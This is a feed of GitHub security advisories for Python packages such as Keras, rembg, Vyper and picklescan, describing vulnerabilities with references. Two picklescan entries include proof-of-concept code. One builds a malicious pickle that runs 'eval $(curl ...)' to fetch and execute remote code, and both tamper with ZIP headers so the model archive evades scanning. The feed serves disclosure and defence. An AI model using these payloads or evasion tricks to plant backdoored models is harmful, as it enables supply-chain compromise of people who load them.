<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/pip.rss</id>
    <title>Security Advisory for Python packages hosted at PyPI.org</title>
    <updated>2025-03-14T09:01:41.510Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"/>
    <subtitle>Security Advisory for Python packages hosted at PyPI.org on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[basicsr] XPixelGroup BasicSR Command Injection]]></title>
        <id>https://github.com/advisories/GHSA-86w8-vhw6-q9qq</id>
        <link href="https://github.com/advisories/GHSA-86w8-vhw6-q9qq"/>
        <updated>2025-03-13T16:25:47.000Z</updated>
        <content type="html"><![CDATA[<p>XPixelGroup BasicSR through 1.4.2 might locally allow code execution in contrived situations where "scontrol show hostname" is executed in the presence of a crafted SLURM_NODELIST environment variable.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-27763">https://nvd.nist.gov/vuln/detail/CVE-2024-27763</a></li>
<li><a href="https://gist.github.com/aydinnyunus/40e1d8a3b529261ae654ff4891f1e192">https://gist.github.com/aydinnyunus/40e1d8a3b529261ae654ff4891f1e192</a></li>
<li><a href="https://github.com/XPixelGroup/BasicSR/blob/master/basicsr/utils/dist_util.py#L44">https://github.com/XPixelGroup/BasicSR/blob/master/basicsr/utils/dist_util.py#L44</a></li>
<li><a href="https://github.com/advisories/GHSA-86w8-vhw6-q9qq">https://github.com/advisories/GHSA-86w8-vhw6-q9qq</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-86w8-vhw6-q9qq</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-03-12T15:32:06.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[rembg] Rembg CORS misconfiguration]]></title>
        <id>https://github.com/advisories/GHSA-59qh-fmm7-3g9q</id>
        <link href="https://github.com/advisories/GHSA-59qh-fmm7-3g9q"/>
        <updated>2025-03-11T21:32:44.000Z</updated>
        <content type="html"><![CDATA[<p>Rembg is a tool to remove images background. In Rembg 2.0.57 and earlier, the CORS middleware is setup incorrectly. All origins are reflected, which allows any website to send cross site requests to the rembg server and thus query any API. Even if authentication were to be enabled, allow_credentials is set to True, which would allow any website to send authenticated cross site requests.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-25302">https://nvd.nist.gov/vuln/detail/CVE-2025-25302</a></li>
<li><a href="https://github.com/danielgatis/rembg/blob/d1e00734f8a996abf512a3a5c251c7a9a392c90a/rembg/commands/s_command.py#L93">https://github.com/danielgatis/rembg/blob/d1e00734f8a996abf512a3a5c251c7a9a392c90a/rembg/commands/s_command.py#L93</a></li>
<li><a href="https://securitylab.github.com/advisories/GHSL-2024-161_GHSL-2024-162_rembg">https://securitylab.github.com/advisories/GHSL-2024-161_GHSL-2024-162_rembg</a></li>
<li><a href="https://github.com/advisories/GHSA-59qh-fmm7-3g9q">https://github.com/advisories/GHSA-59qh-fmm7-3g9q</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-59qh-fmm7-3g9q</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-03-11T21:32:43.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[rembg] Rembg allows SSRF via /api/remove]]></title>
        <id>https://github.com/advisories/GHSA-r5gx-c49x-h878</id>
        <link href="https://github.com/advisories/GHSA-r5gx-c49x-h878"/>
        <updated>2025-03-11T21:31:03.000Z</updated>
        <content type="html"><![CDATA[<p>Rembg is a tool to remove images background. In Rembg 2.0.57 and earlier, the /api/remove endpoint takes a URL query parameter that allows an image to be fetched, processed and returned. An attacker may be able to query this endpoint to view pictures hosted on the internal network of the rembg server. This issue may lead to Information Disclosure.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-25301">https://nvd.nist.gov/vuln/detail/CVE-2025-25301</a></li>
<li><a href="https://securitylab.github.com/advisories/GHSL-2024-161_GHSL-2024-162_rembg">https://securitylab.github.com/advisories/GHSL-2024-161_GHSL-2024-162_rembg</a></li>
<li><a href="https://github.com/advisories/GHSA-r5gx-c49x-h878">https://github.com/advisories/GHSA-r5gx-c49x-h878</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-r5gx-c49x-h878</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-03-11T21:31:01.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[promptflow-core] Azure PromptFlow remote code execution related to Jinja templates]]></title>
        <id>https://github.com/advisories/GHSA-gprr-v9f2-px3c</id>
        <link href="https://github.com/advisories/GHSA-gprr-v9f2-px3c"/>
        <updated>2025-03-11T20:19:56.000Z</updated>
        <content type="html"><![CDATA[<p>Improper isolation or compartmentalization in Azure PromptFlow allows an unauthorized attacker to execute code over a network.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-24986">https://nvd.nist.gov/vuln/detail/CVE-2025-24986</a></li>
<li><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-24986">https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-24986</a></li>
<li><a href="https://github.com/microsoft/promptflow/commit/5f4a41ab4cb15607ade7f26138b0b863b4e4eb0a">https://github.com/microsoft/promptflow/commit/5f4a41ab4cb15607ade7f26138b0b863b4e4eb0a</a></li>
<li><a href="https://github.com/microsoft/promptflow/commit/625061724c51533d28fe6e0e3014b1042afdb07f">https://github.com/microsoft/promptflow/commit/625061724c51533d28fe6e0e3014b1042afdb07f</a></li>
<li><a href="https://github.com/advisories/GHSA-gprr-v9f2-px3c">https://github.com/advisories/GHSA-gprr-v9f2-px3c</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-gprr-v9f2-px3c</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-03-11T18:32:18.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[promptflow-tools] Azure PromptFlow remote code execution related to Jinja templates]]></title>
        <id>https://github.com/advisories/GHSA-gprr-v9f2-px3c</id>
        <link href="https://github.com/advisories/GHSA-gprr-v9f2-px3c"/>
        <updated>2025-03-11T20:19:56.000Z</updated>
        <content type="html"><![CDATA[<p>Improper isolation or compartmentalization in Azure PromptFlow allows an unauthorized attacker to execute code over a network.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-24986">https://nvd.nist.gov/vuln/detail/CVE-2025-24986</a></li>
<li><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-24986">https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-24986</a></li>
<li><a href="https://github.com/microsoft/promptflow/commit/5f4a41ab4cb15607ade7f26138b0b863b4e4eb0a">https://github.com/microsoft/promptflow/commit/5f4a41ab4cb15607ade7f26138b0b863b4e4eb0a</a></li>
<li><a href="https://github.com/microsoft/promptflow/commit/625061724c51533d28fe6e0e3014b1042afdb07f">https://github.com/microsoft/promptflow/commit/625061724c51533d28fe6e0e3014b1042afdb07f</a></li>
<li><a href="https://github.com/advisories/GHSA-gprr-v9f2-px3c">https://github.com/advisories/GHSA-gprr-v9f2-px3c</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-gprr-v9f2-px3c</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-03-11T18:32:18.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[keras] Arbitrary Code Execution via Crafted Keras Config for Model Loading]]></title>
        <id>https://github.com/advisories/GHSA-48g7-3x6r-xfhp</id>
        <link href="https://github.com/advisories/GHSA-48g7-3x6r-xfhp"/>
        <updated>2025-03-11T20:07:33.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>The Keras <code>Model.load_model</code> function permits arbitrary code execution, even with <code>safe_mode=True</code>, through a manually constructed, malicious <code>.keras</code> archive. By altering the <code>config.json</code> file within the archive, an attacker can specify arbitrary Python modules and functions, along with their arguments, to be loaded and executed during model loading.</p>
<h3 id="patches">Patches</h3>
<p>This problem is fixed starting with version <code>3.9</code>.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Only load models from trusted sources and model archives created with Keras.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://www.cve.org/cverecord?id=CVE-2025-1550">https://www.cve.org/cverecord?id=CVE-2025-1550</a></li>
<li><a href="https://github.com/keras-team/keras/pull/20751">https://github.com/keras-team/keras/pull/20751</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/keras-team/keras/security/advisories/GHSA-48g7-3x6r-xfhp">https://github.com/keras-team/keras/security/advisories/GHSA-48g7-3x6r-xfhp</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-1550">https://nvd.nist.gov/vuln/detail/CVE-2025-1550</a></li>
<li><a href="https://github.com/keras-team/keras/pull/20751">https://github.com/keras-team/keras/pull/20751</a></li>
<li><a href="https://github.com/keras-team/keras/commit/e67ac8ffd0c883bec68eb65bb52340c7f9d3a903">https://github.com/keras-team/keras/commit/e67ac8ffd0c883bec68eb65bb52340c7f9d3a903</a></li>
<li><a href="https://github.com/keras-team/keras/releases/tag/v3.9.0">https://github.com/keras-team/keras/releases/tag/v3.9.0</a></li>
<li><a href="https://github.com/advisories/GHSA-48g7-3x6r-xfhp">https://github.com/advisories/GHSA-48g7-3x6r-xfhp</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-48g7-3x6r-xfhp</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-03-11T20:07:32.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[vyper] Vyper: reversed order of side effects for some operations]]></title>
        <id>https://github.com/advisories/GHSA-g2xh-c426-v8mf</id>
        <link href="https://github.com/advisories/GHSA-g2xh-c426-v8mf"/>
        <updated>2025-03-11T17:05:34.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>For the following (probably non-exhaustive) list of expressions, the compiler evaluates the arguments from right to left instead of left to right.</p>
<pre><code>- unsafe_add
- unsafe_sub
- unsafe_mul
- unsafe_div
- pow_mod256
- |, &amp;, ^ (bitwise operators)
- bitwise_or (deprecated)
- bitwise_and (deprecated)
- bitwise_xor (deprecated)
- raw_call
- &lt;, &gt;, &lt;=, &gt;=, ==, !=
- in, not in (when lhs and rhs are enums)
</code></pre>
<p>This behaviour becomes a problem when the evaluation of one of the arguments produces side effects that other arguments depend on. The following expressions can produce side-effect:</p>
<ul>
<li>state modifying external call </li>
<li>state modifying internal call</li>
<li><code>raw_call</code></li>
<li><code>pop()</code> when used on a Dynamic Array stored in the storage</li>
<li><code>create_minimal_proxy_to</code></li>
<li><code>create_copy_of</code></li>
<li><code>create_from_blueprint</code></li>
</ul>
<p>For example:</p>
<pre><code class="language-Vyper">f:uint256

@internal
def side_effect() -&gt; uint256:
    self.f = 12
    return 1

@external
def foo() -&gt; uint256:
    return unsafe_add(self.f,self.side_effect()) # returns 13 instead of 1
</code></pre>
<pre><code class="language-Vyper">a:DynArray[uint256, 12]
@external
def bar() -&gt; bool:
    self.a = [1,2,3]
    return len(self.a) == self.a.pop() # return false instead of true
</code></pre>
<h3 id="patches">Patches</h3>
<p>not yet patched, will address in a future release. tracking in <a href="https://github.com/vyperlang/vyper/issues/3604">https://github.com/vyperlang/vyper/issues/3604</a>.</p>
<h3 id="workarounds">Workarounds</h3>
<p>When using expressions from the list above, make sure that the arguments of the expression do not produce side effects or, if one does, that no other argument is dependent on those side effects.</p>
<h3 id="references">References</h3>
<p><em>Are there any links users can visit to find out more?</em></p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/vyperlang/vyper/security/advisories/GHSA-g2xh-c426-v8mf">https://github.com/vyperlang/vyper/security/advisories/GHSA-g2xh-c426-v8mf</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-40015">https://nvd.nist.gov/vuln/detail/CVE-2023-40015</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/vyper/PYSEC-2023-167.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/vyper/PYSEC-2023-167.yaml</a></li>
<li><a href="https://github.com/vyperlang/vyper/issues/3604">https://github.com/vyperlang/vyper/issues/3604</a></li>
<li><a href="https://github.com/vyperlang/vyper/issues/4019">https://github.com/vyperlang/vyper/issues/4019</a></li>
<li><a href="https://github.com/vyperlang/vyper/pull/4157">https://github.com/vyperlang/vyper/pull/4157</a></li>
<li><a href="https://github.com/advisories/GHSA-g2xh-c426-v8mf">https://github.com/advisories/GHSA-g2xh-c426-v8mf</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-g2xh-c426-v8mf</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2023-09-04T16:39:00.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[keras] Duplicate Advisory: Keras arbitrary code execution vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-5478-v2w6-c6q7</id>
        <link href="https://github.com/advisories/GHSA-5478-v2w6-c6q7"/>
        <updated>2025-03-11T20:07:24.000Z</updated>
        <content type="html"><![CDATA[<h1 id="duplicate-advisory">Duplicate Advisory</h1>
<p>This advisory has been withdrawn because it is a duplicate of GHSA-48g7-3x6r-xfhp. This link is maintained to preserve external references.</p>
<h1 id="original-description">Original Description</h1>
<p>The Keras Model.load_model function permits arbitrary code execution, even with safe_mode=True, through a manually constructed, malicious .keras archive. By altering the config.json file within the archive, an attacker can specify arbitrary Python modules and functions, along with their arguments, to be loaded and executed during model loading.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-1550">https://nvd.nist.gov/vuln/detail/CVE-2025-1550</a></li>
<li><a href="https://github.com/keras-team/keras/pull/20751">https://github.com/keras-team/keras/pull/20751</a></li>
<li><a href="https://github.com/keras-team/keras/commit/e67ac8ffd0c883bec68eb65bb52340c7f9d3a903">https://github.com/keras-team/keras/commit/e67ac8ffd0c883bec68eb65bb52340c7f9d3a903</a></li>
<li><a href="https://github.com/keras-team/keras/releases/tag/v3.9.0">https://github.com/keras-team/keras/releases/tag/v3.9.0</a></li>
<li><a href="https://github.com/advisories/GHSA-5478-v2w6-c6q7">https://github.com/advisories/GHSA-5478-v2w6-c6q7</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-5478-v2w6-c6q7</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-03-11T09:30:30.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[plotai] PlotAI eval vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-2hmp-5wqg-f24h</id>
        <link href="https://github.com/advisories/GHSA-2hmp-5wqg-f24h"/>
        <updated>2025-03-10T22:21:13.000Z</updated>
        <content type="html"><![CDATA[<p>A vulnerability, that could result in Remote Code Execution (RCE), has been found in PlotAI. Lack of validation of LLM-generated output allows attacker to execute arbitrary Python code. PlotAI commented out vulnerable line, further usage of the software requires uncommenting it and thus accepting the risk.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-1497">https://nvd.nist.gov/vuln/detail/CVE-2025-1497</a></li>
<li><a href="https://github.com/mljar/plotai/commit/bdcfb13484f0b85703a4c1ddfd71cb21840e7fde">https://github.com/mljar/plotai/commit/bdcfb13484f0b85703a4c1ddfd71cb21840e7fde</a></li>
<li><a href="https://cert.pl/en/posts/2025/03/CVE-2025-1497">https://cert.pl/en/posts/2025/03/CVE-2025-1497</a></li>
<li><a href="https://cert.pl/posts/2025/03/CVE-2025-1497">https://cert.pl/posts/2025/03/CVE-2025-1497</a></li>
<li><a href="https://github.com/mljar/plotai">https://github.com/mljar/plotai</a></li>
<li><a href="https://github.com/advisories/GHSA-2hmp-5wqg-f24h">https://github.com/advisories/GHSA-2hmp-5wqg-f24h</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-2hmp-5wqg-f24h</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2025-03-10T15:30:47.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[picklescan] Zip Exploit Crashes Picklescan But Not PyTorch ]]></title>
        <id>https://github.com/advisories/GHSA-7q5r-7gvp-wc82</id>
        <link href="https://github.com/advisories/GHSA-7q5r-7gvp-wc82"/>
        <updated>2025-03-10T18:26:45.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>PickleScan is vulnerable to a ZIP archive manipulation attack that causes it to crash when attempting to extract and scan PyTorch model archives. By modifying the filename in the ZIP header while keeping the original filename in the directory listing, an attacker can make PickleScan raise a BadZipFile error. However, PyTorch's more forgiving ZIP implementation still allows the model to be loaded, enabling malicious payloads to bypass detection.</p>
<h3 id="details">Details</h3>
<p>Python's built-in zipfile module performs strict integrity checks when extracting ZIP files. If a filename stored in the ZIP header does not match the filename in the directory listing, zipfile.ZipFile.open() raises a BadZipFile error. PickleScan relies on zipfile to extract and inspect the contents of PyTorch model archives, making it susceptible to this manipulation.</p>
<p>PyTorch, on the other hand, has a more tolerant ZIP handling mechanism that ignores these discrepancies, allowing the model to load even when PickleScan fails. An attacker can exploit this behavior to embed a malicious pickle file inside a model archive, which PyTorch will load, while preventing PickleScan from scanning the archive.</p>
<h3 id="poc">PoC</h3>
<pre><code>import os
import torch

class RemoteCodeExecution:
    def __reduce__(self):
        return os.system, (f"eval \"$(curl -s http://localhost:8080)\"",)


model = RemoteCodeExecution()
file = "does_not_scan_but_opens_in_torch.pth"
torch.save(model, file)

# modify the header to cause the zip file to raise execution in picklescan
with open(file, "rb") as f:
    data = f.read()

# Replace only the first occurrence of "data.pkl" with "datap.kl"
modified_data = data.replace(b"data.pkl", b"datap.kl", 1)

# Write back the modified content
with open(file, "wb") as f:
    f.write(modified_data)

# Load the infected model
torch.load(file)  
</code></pre>
<h3 id="impact">Impact</h3>
<p>Severity: <code>High</code></p>
<ul>
<li><p>Who is impacted? Any organization or individual using PickleScan to detect malicious pickle files in PyTorch models.</p>
</li>
<li><p>What is the impact? Attackers can embed malicious payloads inside PyTorch model archives while preventing PickleScan from scanning them.</p>
</li>
<li><p>Potential Exploits: This technique can be used in supply chain attacks to distribute backdoored models via platforms like Hugging Face.</p>
</li>
</ul>
<h3 id="recommendations">Recommendations</h3>
<ul>
<li><p>Use a More Tolerant ZIP Parser: PickleScan should handle minor ZIP header inconsistencies more gracefully instead of failing outright.</p>
</li>
<li><p>Detect Malformed ZIPs: Instead of crashing, PickleScan should log warnings and attempt to extract valid files.</p>
</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/mmaitre314/picklescan/security/advisories/GHSA-7q5r-7gvp-wc82">https://github.com/mmaitre314/picklescan/security/advisories/GHSA-7q5r-7gvp-wc82</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-1944">https://nvd.nist.gov/vuln/detail/CVE-2025-1944</a></li>
<li><a href="https://github.com/mmaitre314/picklescan/commit/e58e45e0d9e091159c1554f9b04828bbb40b9781">https://github.com/mmaitre314/picklescan/commit/e58e45e0d9e091159c1554f9b04828bbb40b9781</a></li>
<li><a href="https://sites.google.com/sonatype.com/vulnerabilities/cve-2025-1944">https://sites.google.com/sonatype.com/vulnerabilities/cve-2025-1944</a></li>
<li><a href="https://github.com/advisories/GHSA-7q5r-7gvp-wc82">https://github.com/advisories/GHSA-7q5r-7gvp-wc82</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7q5r-7gvp-wc82</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-03-10T18:26:44.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[picklescan] Zip Flag Bit Exploit Crashes Picklescan But Not PyTorch]]></title>
        <id>https://github.com/advisories/GHSA-w8jq-xcqf-f792</id>
        <link href="https://github.com/advisories/GHSA-w8jq-xcqf-f792"/>
        <updated>2025-03-10T18:26:36.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>PickleScan fails to detect malicious pickle files inside PyTorch model archives when certain ZIP file flag bits are modified. By flipping specific bits in the ZIP file headers, an attacker can embed malicious pickle files that remain undetected by PickleScan while still being successfully loaded by PyTorch's torch.load(). This can lead to arbitrary code execution when loading a compromised model.</p>
<h3 id="details">Details</h3>
<p>PickleScan relies on Python’s zipfile module to extract and scan files within ZIP-based model archives. However, certain flag bits in ZIP headers affect how files are interpreted, and some of these bits cause PickleScan to fail while leaving PyTorch’s loading mechanism unaffected.</p>
<p>By modifying the flag_bits field in the ZIP file entry, an attacker can:</p>
<ul>
<li>Embed a malicious pickle file (bad_file.pkl) in a PyTorch model archive.</li>
<li>Flip specific bits (e.g., 0x1, 0x20, 0x40) in the ZIP metadata.</li>
<li>Prevent PickleScan from scanning the archive due to errors raised by zipfile.</li>
<li>Successfully load the model with torch.load(), which ignores the flag modifications.</li>
</ul>
<p>This technique effectively bypasses PickleScan's security checks while maintaining model functionality.</p>
<h3 id="poc">PoC</h3>
<pre><code>import os
import zipfile
import torch
from picklescan import cli

def can_scan(zip_file):
    try:
        cli.print_summary(False, cli.scan_file_path(zip_file))
        return True
    except Exception:
        return False

bit_to_flip = 0x1  # Change to 0x20 or 0x40 to test different flag bits

zip_file = "model.pth"
model = {'a': 1, 'b': 2, 'c': 3}
torch.save(model, zip_file)

with zipfile.ZipFile(zip_file, "r") as source:
    flipped_name = f"flipped_{bit_to_flip}_{zip_file}"
    with zipfile.ZipFile(flipped_name, "w") as dest:
        bad_file = zipfile.ZipInfo("model/bad_file.pkl")
        
        # Modify the ZIP flag bits
        bad_file.flag_bits |= bit_to_flip
        
        dest.writestr(bad_file, b"bad content")
        for item in source.infolist():
            dest.writestr(item, source.read(item.filename))

if model == torch.load(flipped_name, weights_only=False):
    if not can_scan(flipped_name):
        print('Found exploitable bit:', bit_to_flip)
else:
    os.remove(flipped_name)
</code></pre>
<h3 id="impact">Impact</h3>
<p>Severity: <code>High</code></p>
<ul>
<li>Who is impacted? Any organization or user relying on PickleScan to detect malicious pickle files inside PyTorch models.</li>
<li>What is the impact? Attackers can embed malicious pickle payloads inside PyTorch models that evade PickleScan's detection but still execute upon loading.</li>
<li>Potential Exploits: This vulnerability could be exploited in machine learning supply chain attacks, allowing attackers to distribute backdoored models on platforms like Hugging Face or PyTorch Hub.</li>
</ul>
<h3 id="recommendations">Recommendations</h3>
<ul>
<li>Improve ZIP Handling: PickleScan should use a more relaxed ZIP parser marches on when encountering modified flag bits.</li>
<li>Scan All Embedded Files Regardless of Flags: Ensure that files with altered metadata are still extracted and analyzed.</li>
</ul>
<p>By addressing these issues, PickleScan can provide stronger protection against manipulated PyTorch model archives.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/mmaitre314/picklescan/security/advisories/GHSA-w8jq-xcqf-f792">https://github.com/mmaitre314/picklescan/security/advisories/GHSA-w8jq-xcqf-f792</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-1945">https://nvd.nist.gov/vuln/detail/CVE-2025-1945</a></li>
<li><a href="https://github.com/mmaitre314/picklescan/commit/e58e45e0d9e091159c1554f9b04828bbb40b9781">https://github.com/mmaitre314/picklescan/commit/e58e45e0d9e091159c1554f9b04828bbb40b9781</a></li>
<li><a href="https://sites.google.com/sonatype.com/vulnerabilities/cve-2025-1945">https://sites.google.com/sonatype.com/vulnerabilities/cve-2025-1945</a></li>
<li><a href="https://github.com/advisories/GHSA-w8jq-xcqf-f792">https://github.com/advisories/GHSA-w8jq-xcqf-f792</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-w8jq-xcqf-f792</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-03-10T18:26:35.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[picklescan] Duplicate Advisory: Zip Flag Bit Exploit Crashes Picklescan But Not PyTorch]]></title>
        <id>https://github.com/advisories/GHSA-2fh4-gpch-vqv4</id>
        <link href="https://github.com/advisories/GHSA-2fh4-gpch-vqv4"/>
        <updated>2025-03-10T18:31:04.000Z</updated>
        <content type="html"><![CDATA[<h2 id="duplicate-advisory">Duplicate Advisory</h2>
<p>This advisory has been withdrawn because it is a duplicate of GHSA-w8jq-xcqf-f792. This link is maintained to preserve external references.</p>
<h2 id="original-description">Original Description</h2>
<p>picklescan before 0.0.23 fails to detect malicious pickle files inside PyTorch model archives when certain ZIP file flag bits are modified. By flipping specific bits in the ZIP file headers, an attacker can embed malicious pickle files that remain undetected by PickleScan while still being successfully loaded by PyTorch's torch.load(). This can lead to arbitrary code execution when loading a compromised model.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/mmaitre314/picklescan/security/advisories/GHSA-w8jq-xcqf-f792">https://github.com/mmaitre314/picklescan/security/advisories/GHSA-w8jq-xcqf-f792</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-1945">https://nvd.nist.gov/vuln/detail/CVE-2025-1945</a></li>
<li><a href="https://github.com/mmaitre314/picklescan/commit/e58e45e0d9e091159c1554f9b04828bbb40b9781">https://github.com/mmaitre314/picklescan/commit/e58e45e0d9e091159c1554f9b04828bbb40b9781</a></li>
<li><a href="https://sites.google.com/sonatype.com/vulnerabilities/cve-2025-1945">https://sites.google.com/sonatype.com/vulnerabilities/cve-2025-1945</a></li>
<li><a href="https://github.com/advisories/GHSA-2fh4-gpch-vqv4">https://github.com/advisories/GHSA-2fh4-gpch-vqv4</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-2fh4-gpch-vqv4</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-03-10T12:30:56.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[picklescan] Duplicate Advisory: Zip Exploit Crashes Picklescan But Not PyTorch ]]></title>
        <id>https://github.com/advisories/GHSA-w6mr-mj53-x258</id>
        <link href="https://github.com/advisories/GHSA-w6mr-mj53-x258"/>
        <updated>2025-03-10T18:25:49.000Z</updated>
        <content type="html"><![CDATA[<h2 id="duplicate-advisory">Duplicate Advisory</h2>
<p>This advisory has been withdrawn because it is a duplicate of GHSA-7q5r-7gvp-wc82. This link is maintained to preserve external references.</p>
<h2 id="original-description">Original Description</h2>
<p>picklescan before 0.0.23 is vulnerable to a ZIP archive manipulation attack that causes it to crash when attempting to extract and scan PyTorch model archives. By modifying the filename in the ZIP header while keeping the original filename in the directory listing, an attacker can make PickleScan raise a BadZipFile error. However, PyTorch's more forgiving ZIP implementation still allows the model to be loaded, enabling malicious payloads to bypass detection.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/mmaitre314/picklescan/security/advisories/GHSA-7q5r-7gvp-wc82">https://github.com/mmaitre314/picklescan/security/advisories/GHSA-7q5r-7gvp-wc82</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-1944">https://nvd.nist.gov/vuln/detail/CVE-2025-1944</a></li>
<li><a href="https://github.com/mmaitre314/picklescan/commit/e58e45e0d9e091159c1554f9b04828bbb40b9781">https://github.com/mmaitre314/picklescan/commit/e58e45e0d9e091159c1554f9b04828bbb40b9781</a></li>
<li><a href="https://sites.google.com/sonatype.com/vulnerabilities/cve-2025-1944">https://sites.google.com/sonatype.com/vulnerabilities/cve-2025-1944</a></li>
<li><a href="https://github.com/advisories/GHSA-w6mr-mj53-x258">https://github.com/advisories/GHSA-w6mr-mj53-x258</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-w6mr-mj53-x258</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-03-10T12:30:55.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[Django] Django vulnerable to Allocation of Resources Without Limits or Throttling]]></title>
        <id>https://github.com/advisories/GHSA-p3fp-8748-vqfq</id>
        <link href="https://github.com/advisories/GHSA-p3fp-8748-vqfq"/>
        <updated>2025-03-06T22:35:39.000Z</updated>
        <content type="html"><![CDATA[<p>An issue was discovered in Django 5.1 before 5.1.7, 5.0 before 5.0.13, and 4.2 before 4.2.20. The django.utils.text.wrap() method and wordwrap template filter are subject to a potential denial-of-service attack when used with very long strings.</p>
<h3 id="references">References</h3>
<ul>
